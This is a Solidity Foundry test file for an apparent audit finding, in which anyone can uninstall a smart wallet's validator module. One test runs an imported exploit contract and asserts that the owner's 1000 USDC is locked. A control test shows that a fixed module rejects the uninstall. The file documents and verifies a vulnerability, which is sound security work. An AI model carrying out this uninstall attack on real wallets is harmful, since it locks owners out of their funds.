// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    CredibleAccountModuleFixed,
    FixedWallet,
    HookMultiPlexer,
    Owner,
    Usdc
} from "./61408-c-06-anyone-can-uninstall-the-validator-module-from-any-wall.sol";

contract Finding61408Test is Test {
    function test_exploit_uninstall_bricks_owner_execute() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.stuck(), e.LOCKED(), "1000 USDC stuck");
        assertTrue(e.executeReverted(), "owner execute did not revert");
        assertEq(e.token().balanceOf(address(e.wallet())), 1_000_000_000, "wallet balance");
        assertEq(e.token().balanceOf(address(e.owner())), 0, "owner received nothing");
        assertEq(e.module().uninstalledFrom(), address(e.wallet()), "calldata sender");
        assertFalse(e.module().isInitialized(address(e.wallet())), "validator cleared");
        assertEq(e.wallet().executions(), 1, "only the pre-uninstall execute ran");
    }

    function test_control_sender_must_equal_caller() public {
        Usdc token = new Usdc();
        HookMultiPlexer mux = new HookMultiPlexer();
        CredibleAccountModuleFixed fixedModule = new CredibleAccountModuleFixed(address(mux));
        Owner owner = new Owner();
        FixedWallet wallet = new FixedWallet(fixedModule, address(owner), token, address(mux));
        token.mint(address(wallet), 1_000_000_000);

        owner.installFixed(wallet);
        assertTrue(fixedModule.isInitialized(address(wallet)), "installed");

        bytes memory payload = abi.encode(uint256(1), address(wallet));
        vm.expectRevert(abi.encodeWithSelector(
            CredibleAccountModuleFixed.SenderMismatch.selector, address(this), address(wallet)
        ));
        fixedModule.onUninstall(payload);

        assertTrue(fixedModule.isInitialized(address(wallet)), "validator stayed installed");
        owner.executeFixed(wallet, address(owner), 1_000_000_000);
        assertEq(token.balanceOf(address(owner)), 1_000_000_000, "control pays the owner 1000 USDC");
        assertEq(token.balanceOf(address(wallet)), 0, "wallet emptied on the fixed path");
        assertEq(wallet.executions(), 1, "fixed execute ran");
    }
}
